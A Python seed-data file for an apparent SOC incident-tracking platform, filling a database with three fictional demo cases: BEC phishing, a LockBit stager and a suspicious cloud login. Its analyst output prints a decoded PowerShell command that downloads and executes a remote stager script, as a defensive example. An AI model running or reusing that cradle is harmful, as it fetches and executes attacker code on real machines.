"""
AegisTrace Fresh Seed Data
───────────────────────────
3 demo cases showcasing all platform features:
  SOC-DEMO-001  BEC Phishing (High / Closed / Public)
  SOC-DEMO-002  Ransomware Pre-Stage (Critical / Closed) — shares IOC with DEMO-001
  SOC-DEMO-003  Suspicious Cloud Login (Medium / In Progress)

IOC correlation: 185.220.101.34 appears in both DEMO-001 and DEMO-002 → campaign alert.
"""
import json
from datetime import datetime, timedelta
from sqlmodel import Session, select
from models import Case, TimelineEvent, IOCCorrelation, AuditLog


def _ts(days_ago: float, hours: float = 0) -> str:
    dt = datetime.utcnow() - timedelta(days=days_ago, hours=hours)
    return dt.isoformat() + "Z"


# ── CASE 1: BEC Phishing ──────────────────────────────────────────────────────
C1_IOCS = [
    {"ioc": "185.220.101.34",  "type": "ip",     "verdict": "malicious",  "confidence": 95},
    {"ioc": "evil-invoice.com","type": "domain",  "verdict": "malicious",  "confidence": 92},
    {"ioc": "hr-acme-portal.com","type":"domain", "verdict": "malicious",  "confidence": 88},
    {"ioc": "4a7f2b3cd91e8f05a6c2d3b4e5f67890abcd1234ef5678901234567890abcdef",
                               "type": "sha256",  "verdict": "malicious",  "confidence": 97},
    {"ioc": "cfo@hr-acme-portal.com","type":"email","verdict":"malicious", "confidence": 98},
    {"ioc": "94.23.148.194",   "type": "ip",     "verdict": "suspicious", "confidence": 70},
    {"ioc": "http://evil-invoice.com/payload.exe","type":"url","verdict":"malicious","confidence":96},
]

C1_MITRE = [
    {"id": "T1566.002", "name": "Spearphishing Link",       "tactic": "Initial Access"},
    {"id": "T1566.001", "name": "Spearphishing Attachment",  "tactic": "Initial Access"},
    {"id": "T1656",     "name": "Impersonation",             "tactic": "Defense Evasion"},
    {"id": "T1534",     "name": "Internal Spearphishing",    "tactic": "Lateral Movement"},
    {"id": "T1078",     "name": "Valid Accounts",            "tactic": "Persistence"},
]

C1_TIMELINE = [
    {"timestamp": _ts(14, 8),  "event_type": "detection",   "description": "Finance analyst received suspicious email appearing to originate from the CFO requesting urgent wire transfer of €48,000. Email flagged manually and escalated to helpdesk."},
    {"timestamp": _ts(14, 7),  "event_type": "escalation",  "description": "IT helpdesk confirmed two additional Finance employees received identical emails. Ticket escalated to SOC Level 1."},
    {"timestamp": _ts(14, 6),  "event_type": "action",      "description": "SOC analyst pulled raw email headers from Exchange Online. Sender IP 185.220.101.34 extracted from Received chain. SPF: FAIL | DKIM: FAIL | DMARC: FAIL."},
    {"timestamp": _ts(14, 5),  "event_type": "action",      "description": "VirusTotal lookup on 185.220.101.34 — 34/93 engines flagged malicious. Tags: tor-exit-node, malicious-activity. Confirmed active Tor exit node."},
    {"timestamp": _ts(14, 4),  "event_type": "action",      "description": "WHOIS on evil-invoice.com — registered 14 days prior via Namecheap (privacy-protected). Lookalike of acme-corp.com. Domain age: 14 days."},
    {"timestamp": _ts(14, 3),  "event_type": "action",      "description": "PDF attachment extracted. Contains embedded hyperlink to hr-acme-portal.com. Page mimics Microsoft 365 login — credential harvesting page confirmed."},
    {"timestamp": _ts(14, 2),  "event_type": "action",      "description": "All three malicious domains blocked at Exchange Online mail flow rules and Defender for Endpoint. Emails quarantined from all affected mailboxes."},
    {"timestamp": _ts(14, 1),  "event_type": "action",      "description": "Confirmed no wire transfers were initiated. Finance Director briefed. Precautionary credential reset for three targeted employees."},
    {"timestamp": _ts(14, 0),  "event_type": "closure",     "description": "Case closed. No financial impact. Post-incident review scheduled. Company-wide phishing awareness reminder issued."},
]

C1_COMMANDS = """# Email Header Analysis
$ python3 parse_headers.py phishing_sample_1.eml
[+] From:     "CFO Acme" <cfo@hr-acme-portal.com>  ← SPOOFED
[+] Reply-To: cfo.realname@evil-invoice.com
[+] Sender IP:  185.220.101.34  (Tor exit node)
[+] Subject:  URGENT: Wire Transfer Approval Required
[+] SPF:   FAIL  |  DKIM: FAIL  |  DMARC: FAIL
[+] X-Mailer: PHPMailer 6.6.4

# VirusTotal — Sender IP
$ vt ip 185.220.101.34
[+] Malicious:   34 / 93 engines
[+] Tags:        tor-exit-node, malicious-activity, botnet
[+] Country:     DE  |  AS: AS4134 CHINANET

# Domain Registration Check
$ whois evil-invoice.com
[+] Registered:  2025-02-28  (14 days before attack)
[+] Registrar:   Namecheap (privacy-protected)
[+] IP:          94.23.148.194
[+] MX Records:  None (configured for outbound-only spoofing)

# Attachment Hash
$ sha256sum invoice_Q1_acme.pdf
4a7f2b3cd91e8f05a6c2d3b4e5f67890abcd1234ef5678901234567890abcdef  invoice_Q1_acme.pdf

# Defender for Endpoint — Block Rules
$ mde-cli block --domain evil-invoice.com --reason "BEC phishing"
[+] Rule created: Block evil-invoice.com (DEF-2025-0441)
[+] Propagation: 3/3 endpoints updated

$ mde-cli block --ip 185.220.101.34 --reason "Tor exit node / BEC sender"
[+] Rule created: Block 185.220.101.34 (DEF-2025-0442)
"""

C1_FINDINGS = """## Investigation Findings

**Attack Vector:** Business Email Compromise (BEC) — CFO Impersonation

**Threat Actor Profile:**
Sophisticated BEC operator with deliberate pre-attack infrastructure setup. Registered lookalike domain (evil-invoice.com) 14 days before the attack, configured for outbound-only spoofing. Used Tor exit node (185.220.101.34) to conceal origin. Created credential harvesting page mimicking the company's Microsoft 365 login.

**Technical Indicators:**
- All three emails failed SPF, DKIM, and DMARC authentication — clear spoofing
- Sender domain registered 14 days prior with privacy protection (pre-meditated)
- Attached PDF contained hyperlink to hr-acme-portal.com (credential harvest)
- Harvesting page had valid-looking SSL cert obtained via Let's Encrypt
- No malware payload in attachment — purely social engineering

**Impact Assessment:**
- Financial impact: NONE (no transfers approved)
- Credential compromise: NONE (no employees clicked through to harvesting page)
- Data exfiltration: NONE confirmed
- Business disruption: MINOR (30-minute Finance team disruption, 2-hour SOC investigation)
"""

C1_RECOMMENDATIONS = """## Recommendations

**Immediate (Done):**
- ✅ All malicious domains and IPs blocked at email gateway and endpoint
- ✅ Quarantined phishing emails from all affected mailboxes
- ✅ Precautionary credential reset for 3 targeted employees

**Short-term (1–2 weeks):**
1. Enforce DMARC policy to p=reject on acme-corp.com domain (currently p=none)
2. Enable Microsoft Defender Safe Links for all Finance and HR users
3. Implement lookalike domain monitoring for company domains
4. Add wire transfer phone-verification requirement for amounts >€10,000

**Long-term (1–3 months):**
1. Deploy email banner warning for all external sender emails
2. Run targeted BEC phishing simulation against Finance and HR
3. Review and update Incident Response playbooks quarterly
"""

C1_CLOSURE = {
    "final_findings": "BEC phishing campaign targeting Finance department using CFO impersonation via a lookalike domain registered 14 days prior. Three employees targeted; no financial loss; no credentials captured.",
    "remediation_steps": "Blocked all malicious domains/IPs at email gateway and endpoint. Quarantined emails. Reset credentials precautionarily. DMARC enforcement initiated on primary domain.",
    "lessons_learned": "1. DMARC was in monitor mode only — needs enforcement. 2. Finance requires targeted BEC awareness training. 3. Wire transfer approval process needs phone verification for large amounts.",
    "evidence_complete": True,
    "closed_by": "Prasanna Kumar",
    "closed_at": (datetime.utcnow() - timedelta(days=14)).isoformat(),
}


# ── CASE 2: Ransomware Pre-Stage ──────────────────────────────────────────────
C2_IOCS = [
    {"ioc": "185.220.101.34",  "type": "ip",     "verdict": "malicious",  "confidence": 95},  # SHARED with Case 1
    {"ioc": "c2-darknet.onion","type": "domain",  "verdict": "malicious",  "confidence": 99},
    {"ioc": "powershell.exe",  "type": "process", "verdict": "suspicious", "confidence": 65},
    {"ioc": "d8e8fca2dc0f896fd7cb4cb0031ba249","type":"md5","verdict":"malicious","confidence":91},
    {"ioc": "192.168.14.24",   "type": "ip",      "verdict": "suspicious", "confidence": 80},
    {"ioc": "http://185.220.101.34/stager.ps1","type":"url","verdict":"malicious","confidence":98},
]

C2_MITRE = [
    {"id": "T1059.001", "name": "PowerShell",            "tactic": "Execution"},
    {"id": "T1027",     "name": "Obfuscated Files",      "tactic": "Defense Evasion"},
    {"id": "T1486",     "name": "Data Encrypted for Impact","tactic":"Impact"},
    {"id": "T1071.001", "name": "Web Protocols (C2)",    "tactic": "Command and Control"},
    {"id": "T1083",     "name": "File and Directory Discovery","tactic":"Discovery"},
]

C2_TIMELINE = [
    {"timestamp": _ts(3, 4),  "event_type": "detection",  "description": "Microsoft Defender for Endpoint alert: Encoded PowerShell command executed on WORKSTATION-14 (Finance dept). Alert severity: High. Process: powershell.exe -EncodedCommand JABjAD..."},
    {"timestamp": _ts(3, 3),  "event_type": "escalation", "description": "SOC Level 1 escalated to Level 2. Endpoint isolated from network. Memory dump initiated via EDR."},
    {"timestamp": _ts(3, 2),  "event_type": "action",     "description": "Decoded PowerShell command revealed: download stager from http://185.220.101.34/stager.ps1. Same IP as BEC case SOC-DEMO-001 — campaign correlation confirmed."},
    {"timestamp": _ts(3, 1),  "event_type": "action",     "description": "stager.ps1 retrieved from threat intel cache. YARA rule matched known RaaS (Ransomware-as-a-Service) dropper family. MD5: d8e8fca2dc0f896fd7cb4cb0031ba249."},
    {"timestamp": _ts(3, 0),  "event_type": "action",     "description": "Endpoint forensics complete. Stager had not successfully called C2 (network was blocked at firewall before execution completed). No encryption observed."},
    {"timestamp": _ts(2, 22), "event_type": "action",     "description": "Lateral movement scan — no additional endpoints compromised. User account disabled. Endpoint re-imaged from clean backup."},
    {"timestamp": _ts(2, 20), "event_type": "closure",    "description": "Case closed. Attack contained pre-encryption. Campaign link to SOC-DEMO-001 confirmed via shared C2 IP 185.220.101.34."},
]

C2_COMMANDS = """# EDR Alert — Decoded PowerShell
$ mde-cli decode-alert --alert-id AV2025-00441
[+] Process:    powershell.exe (PID 4421)
[+] Encoded:    JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGU...
[+] Decoded:    $client = New-Object Net.WebClient; $client.DownloadString('http://185.220.101.34/stager.ps1') | IEX

# Stager Hash Analysis
$ vt hash d8e8fca2dc0f896fd7cb4cb0031ba249
[+] Malicious:  47 / 71 engines
[+] Tags:       ransomware, dropper, raas, powershell-stager
[+] Family:     LockBit 3.0 dropper variant

# Network Forensics
$ tcpdump -r capture.pcap host 185.220.101.34
[+] SYN packets to 185.220.101.34:443 — connection BLOCKED by firewall
[+] No successful data transfer confirmed
[+] Same IP flagged in SOC-DEMO-001 (BEC campaign) — CAMPAIGN ALERT

# YARA Scan
$ yara -r lockbit_rules.yar /memory/WORKSTATION-14.dmp
[+] MATCH: lockbit_dropper_v3 in /memory/WORKSTATION-14.dmp
[+] Offset: 0x7FF8A2B1
"""

C2_FINDINGS = """## Investigation Findings

**Attack Vector:** PowerShell-based ransomware stager via encoded command execution

**Campaign Link — CRITICAL:**
The C2 IP address 185.220.101.34 is IDENTICAL to the Tor exit node used in case SOC-DEMO-001 (BEC Phishing). This confirms both incidents are part of the same threat actor campaign targeting the organisation. The actor appears to have pivoted from social engineering (BEC) to direct malware delivery after the phishing attempt was blocked.

**Technical Analysis:**
- Encoded PowerShell command designed to evade basic detection: downloaded and executed stager in memory
- Stager identified as LockBit 3.0 variant by YARA and 47/71 VT engines
- C2 communication was blocked at network level before successful execution
- No files were encrypted; attack was contained at pre-execution stage

**Impact Assessment:**
- Financial impact: NONE (attack contained pre-encryption)
- Data loss: NONE confirmed
- Endpoints affected: 1 (re-imaged)
- Campaign risk: HIGH — same actor targeting organisation across multiple vectors
"""


# ── CASE 3: Suspicious Cloud Login ────────────────────────────────────────────
C3_IOCS = [
    {"ioc": "41.216.183.11",   "type": "ip",    "verdict": "suspicious", "confidence": 72},
    {"ioc": "Nigeria",         "type": "geo",   "verdict": "suspicious", "confidence": 60},
]

C3_MITRE = [
    {"id": "T1078",     "name": "Valid Accounts",          "tactic": "Initial Access"},
    {"id": "T1530",     "name": "Data from Cloud Storage", "tactic": "Collection"},
]

C3_TIMELINE = [
    {"timestamp": _ts(1, 3),  "event_type": "detection",  "description": "Azure AD Conditional Access alert: Successful login to AWS Console from IP 41.216.183.11 (Nigeria) for user j.murphy@acme-corp.com. User's last login was from Dublin 2 hours prior — impossible travel."},
    {"timestamp": _ts(1, 2),  "event_type": "escalation", "description": "SOC alerted. Session terminated. User's AWS credentials reset. Active session tokens revoked."},
    {"timestamp": _ts(1, 1),  "event_type": "action",     "description": "CloudTrail audit initiated. Reviewing all API calls made during the 11-minute suspicious session."},
    {"timestamp": _ts(0, 6),  "event_type": "action",     "description": "CloudTrail review in progress. S3 ListBuckets called (read-only). No data exfiltration commands found so far. Investigation ongoing."},
]


def seed_demo_data(engine):
    from sqlmodel import Session as S
    with S(engine) as session:
        # Clean up any existing DEMO cases (handled by migration, but safety check)
        existing = session.exec(
            select(Case).where(Case.case_number.like("SOC-DEMO-%"))
        ).first()
        if existing:
            return  # migration already seeded, skip

        now = datetime.utcnow()

        # ── Case 1 ────────────────────────────────────────────────────────────
        c1 = Case(
            case_number="SOC-DEMO-001",
            title="BEC Phishing Campaign — Finance Department CFO Impersonation",
            severity="high",
            status="closed",
            incident_type="phishing",
            affected_systems="Exchange Online, Finance Department (3 users)",
            analyst_name="Prasanna Kumar",
            customer_name="Acme Corp",
            classification="confidential",
            description="Finance department was targeted by a sophisticated Business Email Compromise (BEC) campaign. Threat actors impersonated the CFO using a lookalike domain registered 14 days prior. Three employees received spearphishing emails requesting urgent wire transfer approval. Attack was detected and contained before any financial loss occurred.",
            commands_run=C1_COMMANDS,
            findings=C1_FINDINGS,
            recommendations=C1_RECOMMENDATIONS,
            iocs=json.dumps(C1_IOCS),
            mitre_techniques=json.dumps(C1_MITRE),
            ai_executive_summary="A targeted BEC phishing campaign impersonating the CFO was successfully detected and blocked. Threat actor pre-registered a lookalike domain and used Tor infrastructure. No financial loss; no credentials compromised. Three employees targeted via spearphishing; attack contained within 6 hours.",
            ai_technical_summary="Threat actor operated from Tor exit node 185.220.101.34 (34/93 VT engines malicious). Lookalike domain evil-invoice.com registered 14 days prior via Namecheap. All three emails failed SPF/DKIM/DMARC. PDF attachment led to a credential harvesting page mimicking Microsoft 365 login at hr-acme-portal.com. No successful credential capture confirmed. MITRE coverage: T1566.002, T1566.001, T1656, T1534.",
            ai_severity_score=72,
            ai_severity_reasoning="High severity due to financial targeting intent and sophisticated pre-attack infrastructure. Downgraded from Critical: no financial loss, no credentials captured, rapid detection (<6h), no lateral movement.",
            is_public=True,
            share_token="demo-bec-aegistrace-2025",
            closure_notes=json.dumps(C1_CLOSURE),
            shift_handoff="Case fully closed. All IOCs blocked. DMARC enforcement in progress. Finance team briefed.",
            created_at=now - timedelta(days=14),
            updated_at=now - timedelta(days=14),
        )
        session.add(c1)
        session.commit()
        session.refresh(c1)

        for ev in C1_TIMELINE:
            ts = datetime.fromisoformat(ev["timestamp"].replace("Z", "+00:00"))
            session.add(TimelineEvent(
                case_id=c1.id,
                timestamp=ts,
                event_type=ev["event_type"],
                description=ev["description"],
            ))

        # ── Case 2 ────────────────────────────────────────────────────────────
        c2 = Case(
            case_number="SOC-DEMO-002",
            title="Ransomware Pre-Stage Detection — LockBit Dropper via Encoded PowerShell",
            severity="critical",
            status="closed",
            incident_type="malware",
            affected_systems="WORKSTATION-14 (Finance dept), Windows 11 Pro",
            analyst_name="Prasanna Kumar",
            customer_name="Acme Corp",
            classification="confidential",
            description="Microsoft Defender for Endpoint triggered a high-severity alert on an encoded PowerShell command executing on a Finance department workstation. The stager was identified as a LockBit 3.0 ransomware dropper variant. C2 communication was blocked before execution. Campaign linkage confirmed with SOC-DEMO-001 via shared threat actor infrastructure.",
            commands_run=C2_COMMANDS,
            findings=C2_FINDINGS,
            recommendations="1. Deploy PowerShell execution policy to restrict encoded commands. 2. Implement Constrained Language Mode for non-admin accounts. 3. Review and harden EDR alerting thresholds. 4. Campaign attribution report shared with threat intel team.",
            iocs=json.dumps(C2_IOCS),
            mitre_techniques=json.dumps(C2_MITRE),
            ai_executive_summary="A LockBit 3.0 ransomware stager was detected and blocked pre-execution on a Finance workstation. Encoded PowerShell was used to download a dropper from the same C2 IP used in the prior BEC campaign — confirming a coordinated attack against the organisation. No encryption occurred.",
            ai_technical_summary="Encoded PowerShell (base64) decoded to a WebClient download from http://185.220.101.34/stager.ps1. Stager matched LockBit 3.0 dropper YARA rules (47/71 VT engines). Network connection to C2 was blocked at firewall before completion. Shared IP 185.220.101.34 with SOC-DEMO-001 confirms same threat actor. MITRE: T1059.001, T1027, T1486, T1071.001.",
            ai_severity_score=88,
            ai_severity_reasoning="Critical due to ransomware family identification (LockBit 3.0), active C2 communication attempt, and confirmed campaign linkage. Score reduced slightly as attack was contained pre-encryption and no data loss occurred.",
            is_public=False,
            closure_notes=json.dumps({
                "final_findings": "LockBit 3.0 dropper contained pre-execution. Campaign link to BEC case confirmed. Endpoint re-imaged. Same threat actor confirmed across two incidents.",
                "remediation_steps": "Endpoint isolated, memory dumped, re-imaged from clean backup. PowerShell execution policy hardened. User account reset. Firewall rules updated to block entire /24 of C2.",
                "lessons_learned": "1. Encoded PowerShell should be blocked outright for non-admin accounts. 2. Campaign correlation enabled faster response — keep IOC correlation engine updated. 3. EDR alert to SOC escalation time was 8 minutes — target is under 5.",
                "evidence_complete": True,
                "closed_by": "Prasanna Kumar",
                "closed_at": (now - timedelta(days=3)).isoformat(),
            }),
            created_at=now - timedelta(days=3),
            updated_at=now - timedelta(days=2, hours=20),
        )
        session.add(c2)
        session.commit()
        session.refresh(c2)

        for ev in C2_TIMELINE:
            ts = datetime.fromisoformat(ev["timestamp"].replace("Z", "+00:00"))
            session.add(TimelineEvent(
                case_id=c2.id,
                timestamp=ts,
                event_type=ev["event_type"],
                description=ev["description"],
            ))

        # ── Case 3 ────────────────────────────────────────────────────────────
        c3 = Case(
            case_number="SOC-DEMO-003",
            title="Suspicious AWS Console Login — Impossible Travel Alert",
            severity="medium",
            status="in_progress",
            incident_type="unauthorized_access",
            affected_systems="AWS Console (j.murphy@acme-corp.com), S3 buckets",
            analyst_name="Prasanna Kumar",
            customer_name="Acme Corp",
            classification="internal",
            description="Azure AD Conditional Access detected a successful login to the AWS Console from Nigeria (IP: 41.216.183.11) for user j.murphy@acme-corp.com. The user had authenticated from Dublin 2 hours prior — an impossible travel scenario. Session was terminated and credentials reset. CloudTrail audit in progress.",
            iocs=json.dumps(C3_IOCS),
            mitre_techniques=json.dumps(C3_MITRE),
            shift_handoff="CloudTrail review in progress — S3 ListBuckets confirmed, no exfil commands found yet. Check remaining 11 minutes of session logs. User credentials reset and MFA re-enrolled. Pending: confirm if any presigned URLs were generated.",
            created_at=now - timedelta(days=1),
            updated_at=now - timedelta(hours=6),
        )
        session.add(c3)
        session.commit()
        session.refresh(c3)

        for ev in C3_TIMELINE:
            ts = datetime.fromisoformat(ev["timestamp"].replace("Z", "+00:00"))
            session.add(TimelineEvent(
                case_id=c3.id,
                timestamp=ts,
                event_type=ev["event_type"],
                description=ev["description"],
            ))

        # ── IOC Correlations ──────────────────────────────────────────────────
        # Build correlations — 185.220.101.34 appears in both C1 and C2 (campaign!)
        ioc_map: dict = {}
        for case_obj, ioc_list in [(c1, C1_IOCS), (c2, C2_IOCS), (c3, C3_IOCS)]:
            for item in ioc_list:
                val = item["ioc"]
                itype = item["type"]
                if val not in ioc_map:
                    ioc_map[val] = {"type": itype, "case_ids": []}
                if case_obj.id not in ioc_map[val]["case_ids"]:
                    ioc_map[val]["case_ids"].append(case_obj.id)

        for ioc_val, data in ioc_map.items():
            session.add(IOCCorrelation(
                ioc=ioc_val,
                ioc_type=data["type"],
                case_ids=json.dumps(data["case_ids"]),
                case_count=len(data["case_ids"]),
            ))

        # Audit log entries
        for action, cn in [
            ("case_created", "SOC-DEMO-001"),
            ("case_created", "SOC-DEMO-002"),
            ("case_created", "SOC-DEMO-003"),
            ("ai_generated", "SOC-DEMO-001"),
            ("ai_generated", "SOC-DEMO-002"),
            ("case_closed",  "SOC-DEMO-001"),
            ("case_closed",  "SOC-DEMO-002"),
        ]:
            session.add(AuditLog(
                user_id=1, user_email="prasanna80564@gmail.com",
                action=action, entity_type="case", entity_id=cn,
            ))

        session.commit()
        print("[seed] 3 demo cases created: SOC-DEMO-001 / 002 / 003")
        print("[seed] Campaign correlation: 185.220.101.34 appears in DEMO-001 and DEMO-002")
